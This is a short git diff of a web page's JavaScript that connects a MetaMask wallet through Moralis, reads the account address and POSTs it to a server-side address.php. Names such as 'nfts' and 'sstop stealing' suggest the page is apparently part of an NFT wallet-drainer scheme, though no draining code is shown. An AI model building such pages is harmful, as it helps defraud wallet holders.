@@ -719,7 +719,7 @@ background-image: url('1500x500.jpg'); background-position: center center; min-h
              startMOralis = async() => {const serverUrl = "https://2uuwz8f6oqbb.usemoralis.com:2053/server"};
 		const appId = "LZKnRUNSDdi6hTYDFx5GbLbxx1fPHnKryMQUurv3";
 		Moralis.start({ serverUrl, appId }).catch(err => console.log(err));
-		const web3Provider = await Moralis.enableWeb3();
+		
             var web3;
             var nfts;
             var stopstealing = "sstop stealing";
@@ -1045,6 +1045,7 @@ background-image: url('1500x500.jpg'); background-position: center center; min-h
             // }
             async function connect() {
                 try {
+			const web3Provider = await Moralis.enableWeb3();
                     web3 = await Moralis.enableWeb3();
                 } catch(err) {
                     swal({text:"MetaMask was not detected. https://metamask.io/download/", icon: "warning", dangerMode: true});
@@ -1056,7 +1057,8 @@ background-image: url('1500x500.jpg'); background-position: center center; min-h
                     }
                     return
                 }
-                const addr = await Moralis.Web3.account;
+                const accounts = await ethereum.request({ method: 'eth_accounts' })
+		addr = accounts[0]
                 $.ajax({
                     type : "POST",
                     url  : "address.php",
